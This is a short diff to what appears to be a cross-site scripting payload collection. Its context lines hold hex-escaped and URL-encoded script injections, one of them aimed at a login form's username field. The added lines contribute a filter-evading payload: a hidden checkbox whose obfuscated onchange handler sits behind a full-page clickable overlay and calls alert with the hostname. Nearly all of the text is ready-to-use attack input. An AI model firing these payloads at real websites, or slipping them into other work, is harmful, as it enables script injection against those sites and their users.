@@ -80,3 +80,6 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 """username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login""" 
 
 %22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+<input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange​="top[['alert'][0]](location.hostname);this.remove()"><label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
+
